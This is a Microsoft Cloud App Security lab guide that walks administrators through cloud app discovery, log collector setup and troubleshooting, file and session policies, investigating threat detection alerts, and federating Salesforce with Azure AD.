- [Reviewing Protected Documents](#reviewing-protected-documents)

# Microsoft Cloud App Security
[:arrow_left: Home](#introduction)

## Introduction

Microsoft Cloud App Security is Microsoft **CASB** (Cloud Access Security Broker) and is a critical component of the Microsoft Cloud Security stack.
It's a comprehensive solution that can help your organization as you move to take full advantage of the promise of cloud applications, but keeps you in control through improved visibility into activity. It also helps increase the protection of critical data across cloud applications (Microsoft **and** 3rd parties).
With tools that help uncover shadow IT, assess risk, enforce policies, investigate activities, and stop threats, your organization can more safely move to the cloud while maintaining control of critical data.

The diagram below describe typical use cases for CASB's.

# Cloud App Security Discovery
[:arrow_left: MCAS Home](#microsoft-cloud-app-security)

On average, more than 1,100 cloud applications are used by enterprises today, of which 61% are **not** sanctioned by IT. This results in duplicate capabilities, apps not meeting compliance standards or posing a security risk to the organization without any IT oversight.
**Discovery** identifies current cloud apps, provides risk assessments and ongoing analytics and lifecycle management capabilities to control the use.


!IMAGE[Discovery](\Media\discovery3.JPG)


To provide this visibility on Shadow IT and cloud apps usage, Cloud App Security ingest and analyze network logs from proxy, firewall but also from **Windows 10** clients within or **ouside** the corporate network, using the native integration with **Windows Defender ATP**.

!IMAGE[Discovery intro](\Media\dis-intro1.png "Discovery intro")


Once the logs have been analyzed, Cloud App Security provides the visibility on **Shadow IT** and alerts you when it detects risky apps or anomalous usage.

!IMAGE[Discovery intro](\Media\dis-intro2.png "Discovery intro")


> [!NOTE] In this lab, we will simulate the upload of network logs from a SQUID proxy to analyze the apps used withing your company. We will not test the Windows Defender ATP integration at it can take up to **2h** before the logs are parsed and the results are visible in the console.

# Cloud Discovery Snapshot Report
[:arrow_left: Discovery lab](#cloud-app-security-discovery-lab)

In this lab, we will create a Discovery **Snapshot report**.
Snapshot Reports is the manual method of uploading files into Cloud App Security. This process is a great and easy way to validate your logs format of have a quick look at the Cloud App Security Discovery capability.
You can upload batches of 20 logs of 1 GB max at a time and they will parse into their own separate report. Any discovery policies you create **will not** apply to these types of reports.

To create snapshot reports:

1. [] Go to the **Discover** section and click on **Create snapshot report**.

    ^IMAGE[Open Screenshot](\Media\dis-newsnaphsot.png "Create snapshot")

1. [] In the Add data source window, use the settings below (do not close the window yet) and click on **View and verify...**.

## Configure and Test Continuous Reports
[:arrow_left: Discovery lab](#cloud-app-security-discovery-lab)

In this lab, we will implement Continuous reports.
Continuous reports analyze all logs that are forwarded from your network using Cloud App Security. They provide improved visibility over all data, and **automatically** identify anomalous use using either the Machine Learning anomaly detection engine or by using custom policies that you define.

These reports can be created by connecting in the following ways:

* **Windows Defender ATP Integration**: Cloud App Security integrates with Windows Defender Advanced Threat Protection (ATP) natively, to simplify rollout of Cloud Discovery, extend Cloud Discovery capabilities beyond your corporate network, and enable machine-based investigation.

* **Log Collector**: Log collectors enable you to easily automate log upload from your network. The log collector runs on your network and receives logs over Syslog or FTP.

* **Zscaler Integration**: If you work with both Cloud App Security and Zscaler, you can integrate the two products to enhance your security Cloud Discovery experience. Together, Cloud App Security and Zscaler provide seamless deployment of Cloud Discovery, automatic blocking of unsanctioned apps, and risk assessment directly in the Zscaler portal.

!IMAGE[Zscaler](\Media\SWG.JPG)

In this lab you will perform the configuration of a **Log collector**.


> [!ALERT] After completing this portion of the lab and validating that your logs have been successfully uploaded and processed by MCAS, you will not immediately see a loaded Discovery Dashboard. Due to Cloud Discovery logs being  parsed **twice a day**.


> [!HINT] For this lab, the Docker engine has been pre-installed on **LinuxVM** in your lab environment, but normally you have to configure it on your host using the command below.
> [!HINT] The command downloads a script installing the Docker engine on your host computer (Ubuntu in this case) and pull the latest Cloud App Security collector image from the Docker library.

# Information Protection
[:arrow_left: MCAS Home](#microsoft-cloud-app-security)

In a perfect world, all your employees understand the importance of information protection and work within your policies. But in a real world, it's probable that a partner who works with accounting uploads a document to your Box repository with the wrong permissions, and a week later you realize that your enterprise's confidential information was leaked to your competition.
Microsoft Cloud App Security helps you prevent this kind of disaster before it happens.

## Information Protection Lab

File policies are a great tool for finding threats to your information protection policies, for instance finding places where users stored sensitive information, credit card numbers and third-party ICAP files in your cloud. With Cloud App Security, not only can you detect these unwanted files stored in your cloud that leave you vulnerable, but you can take im/mediate action to stop them in their tracks and lock down the files that pose a threat.
Using Admin quarantine, you can protect your files in the cloud and remediate problems, as well as prevent future leaks from occurring.

## Test our Policies
[:arrow_up: Top](#information-protection)

We are now going to test our files policies by performing the following actions.

1. [] On Client01, unzip the content of the **Demo files.zip**.

1. [] Go to the **Box** files ```https://app.box.com/folder/0```

1. [] Upload the unzipped files to the site.

    ^IMAGE[Open Screenshot](\Media\info-uploadbox.png "Upload")

1. [] After upload is complete, **share** the PDF document named **Protect with Microsoft Cloud App Security proxy.pdf**

    ^IMAGE[Open Screenshot](\Media\info-share1.png "Upload")

    ^IMAGE[Open Screenshot](\Media\info-share2.png "Upload")

1. [] Cloud App Security will now scan those documents and search for matches to your created policies.

    > [!HINT] The scan can take **several minutes** before completion.

1. [] To monitor the evolution of the scan, go back to Cloud App Security, select **Investigate** and open the **Files** page.

    ^IMAGE[Open Screenshot](\Media\info-files1.png "Search files")

1. [] You can search for the files you uploaded using different criteria, like **file name**, **type**, ... or just look at all the files discovered by Cloud App Security. When a policy match is discovered, you will notice it on this page by looking at the icones next to the file name. You will also have icons related to the applied **Governance action** (AIP label or Admin Quarantine in our lab).

    ^IMAGE[Open Screenshot](\Media\Boxfilesmatch.png)

1. [] To open the details of the file, click on its name. You can see there the matched policies and the scan status of the files.

    ^IMAGE[Scan status](\Media\info-files5.png "Scan status")

1. [] You can also view the related governance actions, like applying the Azure Information classification or moving the file to the quarantine folder, at the file level or in the **Governance log**.

    !IMAGE[Governance log](\Media\Boxgovlog.jpg)

1. [] As we configured **Alerts** in our lab, you can also review the related alerts in the **Alerts page**.

    ^IMAGE[Alert](\Media\Boxalert1.png)

    ^IMAGE[Alert](\Media\Boxalert2.png)

1. [] If you go back to **Box**, you will also notice that the quarantined files will be replaced by **placeholders**. The original file will be moved to the **Quarantine**.

    > [!KNOWLEDGE]  For Box, the quarantine folder location and user message **can't be customized**. The folder location is the drive of the admin who connected Box to Cloud App Security. For **SharePoint and OneDrive**, the location and the message can be customized in Cloud App Security settings.

    ^IMAGE[Open Screenshot](\Media\boxquarantine2.png)

    ^IMAGE[Open Screenshot](\Media\boxquarantine1.png)

# Conditional Access App Control with Office 365
[:arrow_left: MCAS Home](#microsoft-cloud-app-security) :clock10: 15 min

## Introduction

Conditional Access App Control utilizes a reverse proxy architecture and is uniquely integrated with Azure AD conditional access.
Azure AD conditional access allows you to enforce access controls on your organization’s apps based on certain conditions. The conditions define who (for example a user, or group of users) and what (which cloud apps) and where (which locations and networks) a conditional access policy is applied to. After you’ve determined the conditions, you can route users to the Microsoft Cloud App Security where you can protect data with Conditional Access App Control by applying access and session controls.

Conditional Access App Control enables user app access and sessions to be **monitored and controlled in real time** based on access and session policies.

!IMAGE[AAD portal](\Media\caac1.jpg)

> [!NOTE] **App Control Access and Session policies give you the capability to the following:**
* **Block on download**: You can block the download of sensitive documents. For example, on unmanaged devices.
* **Protect on download**: Instead of blocking the download of sensitive documents, you can require documents to be protected via encryption on download. This ensures that the document is protected, and user access is authenticated, if the data is downloaded to an untrusted device.
* **Monitor low-trust user sessions**: Risky users are monitored when they sign into apps and their actions are logged from within the session. You can investigate and analyze user behavior to understand where, and under what conditions, session policies should be applied in the future.
* **Block access**: You can completely block access to specific apps for users coming from unmanaged devices or from non-corporate networks.
* **Create read-only mode**: By monitoring and blocking custom in-app activities you can create a read-only mode to specific apps for specific users.
* **Restrict user sessions from non-corporate networks**: Users accessing a protected app from a location that is not part of your corporate network, are allowed restricted access and the download of sensitive materials is blocked or protected.

# Reviewing the Alerts
[:arrow_left: Home](#labs)

Now that we validated our configuration, let's go back to the admin view.

1. [] Go back to the Cloud App Security console ```https://portal.cloudappsecurity.com```

1. [] Go to the **Alerts** page.

   ^IMAGE[Open Screenshot](\Media\appc-admin-1.png)

1. [] Click on the alert generated by our policy.

   !IMAGE[Menu](\Media\appc-admin-2.png)

1. [] On the alert page, you can see that the **admin** user tried to download a file named **Personal employees information.docx** but **Session control** blocked the download. You also see the name of the policy that triggered the alert.

   !IMAGE[Menu](\Media\appc-admin-3.png)

1. [] To go further in the investigation, click on  **View all user activity**. This will redirect you to the Activity log where you can see all the user activities.

   !IMAGE[Menu](\Media\appc-admin-4.png)

1. [] By looking at the user activities, you can follow her/his trace:

    1. Below, you can see that the user was **redirected** to Cloud App Security

        !IMAGE[Menu](\Media\appc-admin-5.png)

    1. Here, you can see that during her/his session, the user **successfuly downloaded** a file named **Worplace Innovation.xlsx**, as this file didn't match any blocking policy.

# Cloud App Security: Threat Detection Lab
[:arrow_left: MCAS Home](#microsoft-cloud-app-security)

Cloud App Security provides several threats detection policies using machine learning and **user behavior analytics** to detect suspicious activities across your different applications.
Those policies are enabled by default and after an initial learning period, Cloud App Security will start alerting you when suspicious actions like activity from anonymous IP addresses, infrequent country, suspicious IP addresses, impossible travel, ransomware activity, suspicious inBox forwarding configuration or unusual file download are detected.

!IMAGE[Thret protection](\Media\tp-intro.png)

===

> [!ALERT] It can take **up to 24 hours** for the auditing in Office 365 to be configured, meaning that Cloud App Security will not receive the activities events. As many alerts relies on activities events to work, we will be using a pre-populated tenant for this portion of the lab so we can see alerts and have the ability to investigate them.

===

## Anonymous access

[:arrow_up: Top](#cloud-app-security-threat-detection-lab)

This detection identifies that users were active from an IP address that has been identified as an anonymous proxy IP address. These proxies are used by people who want to hide their device’s IP address, and may be used for malicious intent. This detection uses a machine learning algorithm that reduces "false positives", such as mis-tagged IP addresses that are widely used by users in the organization.

### Investigate

As your authentication during the previous steps came from an anonymous IP address, it will be detected as suspicious by Cloud App Security.

1. [] Go back to the Cloud App Security portal and review the alerts.

   !IMAGE[MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   !IMAGE[TOR alert](\Media\td-toralert.png "TOR alert")

2. [] Click on the alert to open it.
   You see in this page more information on the alert and the related activities:

   !IMAGE[TOR alert](\Media\td-toralert-details.png "TOR alert details")

3. [] Click on the activities to get more information on the specific activity, the user and the IP address:

   !IMAGE[TOR alert](\Media\td-toralert-details-user.png "TOR alert user")
   !IMAGE[TOR alert](\Media\td-toralert-details-ip.png "TOR alert IP address")

4. [] You can go further in your investigation by looking at the related actions performed during that session by clicking on the “investigate in activity log" button:

   !IMAGE[TOR alert](\Media\td-toralert-details-activities.png "TOR alert activities")

5. [] You will then be redirected to the activity log where you will be able to investigate on the actions performed during that session, like configuration changes or data exfiltration.

---

## Impossible travel

[:arrow_up: Top](#cloud-app-security-threat-detection-lab)

This detection identifies two user activities (is a single or multiple sessions) originating from geographically distant locations within a time period shorter than the time it would have taken the user to travel from the first location to the second, indicating that a different user is using the same credentials. This detection uses a machine learning algorithm that ignores obvious "false positives" contributing to the impossible travel condition, such as VPNs and locations regularly used by other users in the organization. The detection has an initial learning period of seven days during which it learns a new user’s activity pattern.

### Investigate

As the first and the second authentication came from distinct locations, Cloud App Security will detect that those time to travel between those two locations was to short and will then alert you.

1. [] Go back to the Cloud App Security portal and review the alerts.

   !IMAGE[MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   !IMAGE[Impossible travel alert](\Media\td-impossibletravelalert.png "Impossible travel alert")

2. [] The investigation steps are similar to the anonymous access but by looking at the IP address details and the **ISP**, you will be able to determine the possible risk:

   !IMAGE[Impossible travel alert](\Media\td-impossibletravelalert-details.png "Impossible travel alert details")

	> [!KNOWLEDGE] To reduce the amount of false positives, edit the impossible travel policy. 
	>  
	> **You can adjust the policy by clicking on the alert and *Resolve* and click on *Adjust policy.**
	> 
	> Each anomaly detection policy can be independently scoped so that it applies only to the users and 
	groups you want to include and exclude in the policy. For example, you can set the Activity from infrequent county detection to ignore a specific user who travels frequently.
	> 
	> **To scope an anomaly detection policy:**
	> 
    > 1. Click Control and then Policies, and set the Type filter to Anomaly detection policy.
	> 2. Click on the policy you want to scope. 
    > 3. Under Scope, change the drop-down from the default setting of All users and groups, to Specific users and groups. 
	> 4. Select Include to specify the users and groups for whom this policy will apply. Any user or group not selected here won't be    considered a threat and won't generate an alert.
	> 5. Select Exclude to specify users for whom this policy won't apply. Any user selected here won't be considered a threat and won't generate an alert, even if they're members of groups selected under Include.
	> 
	> **Sensitivity Slider:**
	> 
    > You can set the sensitivity slider to determine the level of anomalous behavior needed before an alert is triggered. For example, if you set it to low, it will suppress Impossible Travel alerts from a user’s common locations, and if you set it to high, it will surface such alerts.
	> 
	>  !IMAGE[Impossible Travel Sensitivity Bar](\Media\updatedimpossibletravel.JPG)  

---

## Activity from infrequent country

[:arrow_up: Top](#cloud-app-security-threat-detection-lab)

This detection considers past activity locations to determine new and infrequent locations. The anomaly detection engine stores information about previous locations used by users in the organization. An alert is triggered when an activity occurs from a location that wasn't recently or never visited by any user in the organization.

### Investigate

After an initial learning period, Cloud App Security will detect that this location was not used before by your user or other people within the organization and will then alert you.

1. [] Go back to the Cloud App Security portal and review the alerts.

   !IMAGE[MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   !IMAGE[Infrequent country alert](\Media\td-infrequentcountryalert.png "Infrequent country alert")

2. [] The investigation steps are similar to the anonymous access but by looking at the IP address details and the ISP, you will be able to determine the possible risk. In this specific example, we see it’s coming from a TOR IP, so this authentication is suspicious:

   !IMAGE[Infrequent country alert](\Media\td-infrequentcountryalert-details.png "Infrequent country alert details")

	> [!NOTE] Possible resolution options are available on the top bar for single click remediation. 

	!IMAGE[Infrequent country alert](\Media\infrequentcountry1.JPG)

## Malware detection

[:arrow_up: Top](#cloud-app-security-threat-detection-lab)

This detection identifies malicious files in your cloud storage, whether they're from your Microsoft apps or third-party apps. Microsoft Cloud App Security uses Microsoft's threat intelligence to recognize whether certain files are associated with known malware attacks and are potentially malicious. This built-in policy is disabled by default. Not every file is scanned, but heuristics are used to look for files that are potentially risky. After files are detected, you can then see a list of **Infected files**. Click on the malware file name in the file drawer to open a malware report that provides you with information about that type of malware the file is infected with.

### Investigate

1. [] Go back to the Cloud App Security portal and review the alerts.

   !IMAGE[MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   !IMAGE[Malware detected alert](\Media\td-malwarealert.png "Malware detected alert")

2. [] Click on the alert to open it. You see in this page more information on the alert and the related activities:

   !IMAGE[Malware detected alert](\Media\td-malwarealert-details.png "Malware detected alert")

3. [] In the alert, you have more information on the file and its location, but also the malware that we identified:

   !IMAGE[Malware family](\Media\td-malwarefamily.png "Malware family")

4. [] Click on the malware type link to have access to the Microsoft Threat Intelligence report regarding this file:

   !IMAGE[Malware family](\Media\td-malwarefamilymti.png "Malware family")

5. [] Back in the alert, you can scroll down to the related activities. There, you will have more information on how the file was uploaded to OneDrive and possibly who downloaded it:

   !IMAGE[Malware family](\Media\td-malwarealert-activities.png "Malware family")

---

## Email exfiltration using suspicious inBox forwarding

[:arrow_up: Top](#cloud-app-security-threat-detection-lab)

This detection looks for suspicious email forwarding rules, for example, if a user created an inBox rule that forwards a copy of all emails to an external address.

### Investigate

As the rules redirects your user’s emails to a suspicious external address, Cloud App Security will detect this rule creation and will then alert you.

1. [] Go back to the Cloud App Security portal and review the alerts.

   !IMAGE[MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   !IMAGE[Suspicious forwarding alert](\Media\td-suspiciousforwardingalert.png "Suspicious forwarding alert")

2. [] Click on the alert to open it. You see in this page more information on the alert, like the **destination address** and the related activities:

   !IMAGE[Suspicious forwarding alert](\Media\td-suspiciousforwardingalert-details.png "Suspicious forwarding alert")

3. [] With this information, you can now go back to the user to remove this rule but also investigate in Exchange trace logs which emails were sent to that destination address.

---

## Ransomware activity

Cloud App Security extended its ransomware detection capabilities with anomaly detection to ensure a more comprehensive coverage against sophisticated Ransomware attacks. Using our security research expertise to identify behavioral patterns that reflect ransomware activity,Cloud App Security ensures holistic and robust protection. If Cloud App Security identifies, for example, a high rate of file uploads or file deletion activities it may represent an adverse encryption process. This data is collected in the logs received from connected APIs and is then combined with learned behavioral patterns and threat intelligence, for example, known ransomware extensions. For more information about how Cloud App Security detects ransomware, see Protecting your organization against ransomware.

### Investigate

As the rules redirects your user’s emails to a suspicious external address, Cloud App Security will detect this rule creation and will then alert you.

1. [] Go back to the Cloud App Security portal and review the alerts.

   !IMAGE[MCAS alerts menu](\Media\td-alerts.png "Security Alerts")

   You will see an alert similar  to this one:

   !IMAGE[Ransomware alert](\Media\td-ransomwarealert.png "Ransomware alert")

2. [] Click on the alert to open it. You see in this page more information on the impacted user, the number of encrypted files, the location of the files and the related activities:

   !IMAGE[Ransomware alert](\Media\td-ransomwarealert-details.png "Ransomware alert")

3. [] Now that we’ve seen the alert, let’s go back to the policies:

   !IMAGE[Policies](\Media\td-policies.png "Policies")

4. [] Search for the “Ransomware activity” policy and open it:

   !IMAGE[Ransomware policy](\Media\td-policiesransomware.png "Ransomware policies")

5. [] At the bottom of the policy, review the possible alerts and governance actions:

   !IMAGE[Ransomware policy](\Media\td-policiesransomware-governance.png "Ransomware policies")

## Suspicious application consent

[:arrow_up: Top](#cloud-app-security-threat-detection-lab)

Many third-party productivity apps that might be installed by business users in your organization request permission to access user information and data and sign in on behalf of the user in other cloud apps, such as Office 365, G Suite and Salesforce. 
When users install these apps, they often click accept without closely reviewing the details in the prompt, including granting permissions to the app. This problem is compounded by the fact that IT may not have enough insight to weigh the security risk of an application against the productivity benefit that it provides.
Because accepting third-party app permissions is a potential security risk to your organization, monitoring the app permissions your users grant gives you the necessary visibility and control to protect your users and your applications. The Microsoft Cloud App Security app permissions enable you to see which user-installed applications have access to Office 365 data, G Suite data and Salesforce data, what permissions the apps have, and which users granted these apps access to their Office 365, G Suite and Salesforce accounts. 

Here is an example of such user consent:

!IMAGE[App consent](\Media\td-appconsent.png "App consent")

### Investigate

1. [] Without even creating policies, Cloud App Security shows you the applications that received permissions from your users:

   !IMAGE[App permissions](\Media\td-oauth.png "App permissions")

2. [] From this page, you can easily see who granted permissions to those apps, if they are commonly used or their permissions level:

   !IMAGE[App commodity](\Media\td-zapiercommodity.png "App commodity")

3. [] If you detect that an application should not be granted access to your environment, you can revoke the app access.
   > **IMPORTANT:** This operation will apply to the **entire** organization:

   !IMAGE[App revoke](\Media\td-apprevoke.png "App revoke")

4. [] When investigating, you can search for apps rarely used in Office 365 which were granted high privileges and create a **policy** to be automatically alerted when such action is performed:

   !IMAGE[App filter](\Media\td-appfilter.png "App filter")

5. [] After clicking on the “New policy from search” button, you can see that your filter will be used to create a new policy:

   !IMAGE[App policy](\Media\td-apppolicy.png "App policy")

6. [] Go down on that page and review the possible alerts and governance automatic actions that you can configure:

   !IMAGE[App policy](\Media\td-apppolicy-governance.png "App policy")

7. [] To go further in your investigation, let’s now pivot to the “Activity log”:

   !IMAGE[Activity log](\Media\td-activitylog.png "Activity log")

8. [] In the activity log, search for "**Consent to application**" activities:

   !IMAGE[Activity log](\Media\td-activitylog-consent01.png "Activity log")

9. [] You will then be able to investigate on who, when and from where your users granted access to applications:

   !IMAGE[Activity log](\Media\td-activitylog-consent02.png "Activity log")

Now that we reviewed some of the default detection capabilities of Cloud App Security, you should start creating your own policies.
Cloud App Security provides by default many has policies templates to start creating your custom policies.

1. [] To create your policies, go to “Policies”:

   !IMAGE[Policies](\Media\td-policies.png "Policies")

2. [] Click on “Create policy” and select the type of policy you want to create:

   !IMAGE[Policies types](\Media\td-policiestypes.png "Policies types")

3. [] In the policy screen, choose the policy template you want to use:

   !IMAGE[Policies templates](\Media\td-policiestemplates.png "Policies templates")

4. [] Apply the template:

   !IMAGE[Apply template](\Media\td-applytemplate.png "Apply template")

5. [] Cloud App Security will then populate the different properties of the policy:

   !IMAGE[Policy template filter](\Media\td-policytemplatefilter.png "Policy template filter")

6. [] Review those properties and customize them if needed.

7. [] Explore other types of policies and review the proposed templates.

# Management with PowerShell
[:arrow_left: MCAS Home](#microsoft-cloud-app-security)) :clock10: 15 min

To help administrators interact with MCAS in a programmatic way, two
Microsoft employees created a non-official PowerShell module for Cloud
App Security. For this lab, you will install this module and discover
the available cmdlets.

Note: the module relies on the Cloud App Security API. You can find its
documentation in the MCAS portal.

!IMAGE[f847xhzx.jpg](\Media\f847xhzx.jpg)

The module is available in the PowerShell gallery and can be installed
using the *Install-Module mcas* command.

!IMAGE[6j16dgs2.jpg](\Media\6j16dgs2.jpg)

More information on the module is available on GitHub:
[https://github.com/powershellshock/MCAS-Powershell](https://github.com/powershellshock/MCAS-Powershell)

After installing the module, read how to connect to MCAS in the
PowerShell help and start exploring the cmdlets.

Hint: you'll have to create an API token in Cloud App Security.

!IMAGE[0x2tzeqd.jpg](\Media\0x2tzeqd.jpg)

Using PowerShell:

1.  [] Review the list of MCAS administrators and when they were granted
    those permissions

2.  [] Review your security alerts and close them in bulk

3.   [] Download a sample SQUID log and send it to MCAS as a snapshot
    report.

4.   [] In the portal, in Discovery, tag some apps as unsanctioned and
    generate a blocking script for your appliance to block access to
    those apps.

5.   [] You are asked to define corporate IP's in MCAS. Subnets go from
    10.50.50.0/24 to 10.50.80.0/24

# Log Collector Troubleshooting
[:arrow_left: Home](#labs) :clock10: 15 min

In this task, you will review possible troubleshooting steps to identify issues in automatic logs upload from the log collector.
There are several things to test at different locations: in the log collector, in MCAS, at the network level.

## Useful commands

* `cd` : *Used to navigate in the directories*
    >**Examples:**
    >
    >`cd /var/adallom` : *to go to the specified directory*
    >
    >`cd /` : *to go to the root directory*
    >
    >`cd ..` : *to go to the parent directory*

* `more` or `cat` : *Used to display the content of the logs*
    > **Examples:**
    >
    >`more trace.log` : *to display the content of the trace.log file*

* `tail` : *Used for outputting the last part of files*

* `ll` : *Used to display the content of the directory as a list*. This command is an alias for `ls -l`

* `clear` : *Used to clear the screen*

* `tab key` : Used to perform autocompletion

## Verify the log collector (container) status

1. [] On **Client01**, open a session on PuTTY to **192.168.141.125** and use the credentials below.
    In the PuTTY Configuration window, enter **192.168.141.125** and click **Open**.

    ^IMAGE[Open Screenshot](\Media\dis-puttyconfig.png "Putty config")

    Log in using the credentials below.
    >|Username|Password|
    >|---|---|
    >|user01|Passw0rd1|
    >
    >:warning:The password doesn't appear in the command prompt, you can safely press enter to validate the credentials.

2. [] Run the following commands:

    ``` 
    sudo -i
    docker stats
    ```
    !IMAGE[Docker stats](\Media\dis-dockerstats.png "Docker stats")

     > [!HINT] This command will show you the status of the log collector instance.

3. [] Press `Ctrl-C` to end the command.

4. [] Next, run the command below:

    ``` 
    docker logs --details LogCollector
    ```
    !IMAGE[Docker log](\Media\dis-dockerlog.png "Docker log")

     > [!HINT] This command will show you the container logs to verify if it encountered errors when initiating.

### Verify the log collector logs

1. [] Type the following command:

    ``` 
    docker exec -it LogCollector bash
    ```
     > [!HINT] This command will execute the container's bash. You will then be able to execute commands *from inside* of the log collector.

2. [] You can now explore the container filesystem and inspect the **/var/adallom** directory. This directory is where you will investigate most of the issues with the syslog or ftp logs being sent to the log collector.

    ``` 
    cd /var/adallom
    ll
    ```

    !IMAGE[adallom folder](\Media\dis-dockerll.png "adallom folder")

    Go to the following folders and review their log files using `more`:
    * **/adallom/ftp/discovery**: this folder contains the data source folders where you send the log files for automated upload. This is also the default folder when logging into the collector with FTP credentials.
    * **/adallom/syslog/discovery**: if you setup the log collector to receive syslog messages, this is where the flat file of aggregated messages will reside until it is uploaded.
    * **/adallom/discoverylogsbackup**: this folder contains the last file that was sent to MCAS. This is useful for looking at the raw log in case there are parsing issues.

3. [] To validate that logs are correctly received from the network appliance, you can also verify the **/var/log/pure-ftpd** directory and check the transfer log:

    ``` 
    tail transfer.log
    ```

    !IMAGE[FTP logs](\Media\dis-pureftp.png "FTP logs")

4. [] Now, move to the **/var/log/adallom** directory.

    !IMAGE[var log](\Media\dis-varlog.png "var log")

    Go to the following folders and review their content and log files using `ll` and `more` or `tail`:
    * **/var/log/adallom/columbus**: this folder is where you will find log files useful for troubleshooting issues with the collector sending files to Cloud App Security. In the **log-archive** folder you can find previous logs compressed as *.tar.gz* files that could be used to send to support for example.
    * **/var/log/adallom/columbusInstaller**: this is where you will investigate issues with the log collector itself. You will find here logs related to the configuration and bootstrapping of the collector. For example, **trace.log** will show you the bootstrapping process:

    !IMAGE[Bootstrapping log](\Media\dis-bootstrapping.png "bootstrapping log")

## Verify the connectivity between the log collector and Cloud App Security

An easy way to test the connectivity after configuring the log collector is to download a sample of your appliance logs from and use WinSCP to connect to the log collector to upload it and see if it gets uploaded to Cloud App Security, as you did in the previous exercise

!IMAGE[Pending log](\Media\dis-pending.png "Log pending")

> [!HINT] If the log stays in the source folder for too long, then you know you probably have a connection issue between the log collector and Cloud App Security and should go investigate the logs reviewed previously.

# Conditional Access App Control with 3rd party apps
[:arrow_left: MCAS Home](#microsoft-cloud-app-security) :clock10: 45 min

## Introduction

Conditional Access App Control utilizes a reverse proxy architecture and is uniquely integrated with Azure AD conditional access. Azure AD conditional access allows you to enforce access controls on your organization’s apps based on certain conditions. The conditions define who (for example a user, or group of users) and what (which cloud apps) and where (which locations and networks) a conditional access policy is applied to. After you’ve determined the conditions, you can route users to the Microsoft Cloud App Security where you can protect data with Conditional Access App Control by applying access and session controls.

Conditional Access App Control enables user app access and sessions to be monitored and controlled in real time based on access and session policies. Access and session policies are utilized within the Cloud App Security portal to further refine filters and set actions to be taken on a user.

With the access and session policies, you can:

* **Block on download**: You can block the download of sensitive documents. For example, on unmanaged devices.
* **Protect on download**: Instead of blocking the download of sensitive documents, you can require documents to be protected via encryption on download. This ensures that the document is protected, and user access is authenticated, if the data is downloaded to an untrusted device.
* **Monitor low-trust user sessions**: Risky users are monitored when they sign into apps and their actions are logged from within the session. You can investigate and analyze user behavior to understand where, and under what conditions, session policies should be applied in the future.
* **Block access**: You can completely block access to specific apps for users coming from unmanaged devices or from non-corporate networks.
* **Create read-only mode**: By monitoring and blocking custom in-app activities you can create a read-only mode to specific apps for specific users.
* **Restrict user sessions from non-corporate networks**: Users accessing a protected app from a location that is not part of your corporate network, are allowed restricted access and the download of sensitive materials is blocked or protected.

>:memo: In this lab, we will cover only some scenarios.

===

## Federate Salesforce with Azure AD

[:arrow_up: Top](#conditional-Access-App-Control)

>:warning: As Conditional Access App Control requires the protected app to be federated with your IdP (Azure AD in our case), we will first federate Saleforce with our tenant before moving to the controls configuration. Please go through all the steps exactly as described to avoid any complications further in the lab.

1. [] Create a Salesforce developer account.

    * On Client01, launch a browser and create a Salesforce developer org at this address: [https://developer.salesforce.com/signup](https://developer.salesforce.com/signup).
      This org (or tenant) will allow you to create a test environment to federate with our Azure AD tenant.

      >:memo: Dev Salesforce orgs are available for free but are deleted after extended periods of inactivity.
      >
      > :warning: Use your lab tenant admin user as the Email and Username

      !IMAGE[Dev sign-up](\Media\appc-signup.png "Salesforce sign-up")

    * Fill in the rest of details, click **Sign me up**, accept the **verification email** in your mailBox, and choose a new password. Use the admin password provided in the lab environment if possible.

        !IMAGE[Dev sign-up](\Media\appc-signup2.png "Salesforce sign-up")

        !IMAGE[Dev sign-up](\Media\appc-signup3.png "Salesforce sign-up")

2. [] Configure Salesforce in Azure AD for single sign-on.

    * In Salesforce, go to **Setup**, search for **My Domain** and register a new domain matching your Office 365 lab domain, e.g., **ems123456-dev-ed.salesforce.com**

        !IMAGE[My domain](\Media\sf-mydomain.png "My domain")

        !IMAGE[My domain](\Media\sf-registerdomain.png "My domain")

        !IMAGE[My domain](\Media\sf-registerdomain2.png "My domain")

    * Save **full Salesforce domain name**, including **https://** for the next step, e.g., **https://ems123456-dev-ed.salesforce.com**

        >:warning: Do not close this page !

        !IMAGE[My domain](\Media\sf-registerdomain3.png "My domain")

    * Go to **https://portal.azure.com** were we will add Salesforce as an Enterprise application and configure **single sign-on**, which is a requirement for using App Control.

3. [] Go to **Azure Active Directory**, click on **Enterprise applications**, and add the **Salesforce** application. Call it **SalesforceCAS**, and click on **Add**.

    !IMAGE[Add SF](\Media\appc-app1.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app2.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app3.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app4.png "Add SF")

4. [] Now that Salesforce has been added as an Enterprise application, we have to configure **single sign-on**.

    !IMAGE[Add SF](\Media\appc-app5.png "Add SF")

5. [] Select **SAML** as the SSO method.

    !IMAGE[Add SF](\Media\appc-app6.png "Add SF")

6. [] We will now configure the SAML single sign-on using the information provided by Salesforce when we added our domain.

    >:warning: Do not forget to add **https://** in front of the domain name provided by Salesforce.

    !IMAGE[Add SF](\Media\appc-app7.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app8.png "Add SF")

7. [] Close the pane and go to the **Step 4** of the SSO wizard and click on **View step-by-step instructions**. This page will give you all the required information for configuring Salesforce SSO.

    !IMAGE[Add SF](\Media\appc-app9.png "Add SF")

    !IMAGE[Add SF](\Media\appc-app10.png "Add SF")

8. [] Go back to the **Salesforce admin page** and go to the **Signle sign-on** settings. There, click on the **Edit** button.

    !IMAGE[Add SF](\Media\appc-app11.png "Add SF")

9. [] Enable single sign-on using SAML and click on the **Save** button.

    !IMAGE[Add SF](\Media\appc-app12.png "Add SF")

10. [] Back on the configuration page, under **SAML Single Sign-On Settings**, click on **New**.

    !IMAGE[Add SF](\Media\appc-app13.png "Add SF")

    We will now configure those settings using the information provided in the **Azure AD portal**.

    !IMAGE[Add SF](\Media\appc-app14.png "Add SF")

11. [] For the configuration, you will have to use the information provided at the bottom of the Azure AD **Configure sign-on** pane. Scroll down until you reach the **Quick reference** section.

    !IMAGE[Add SF](\Media\appc-app15.png "Add SF")

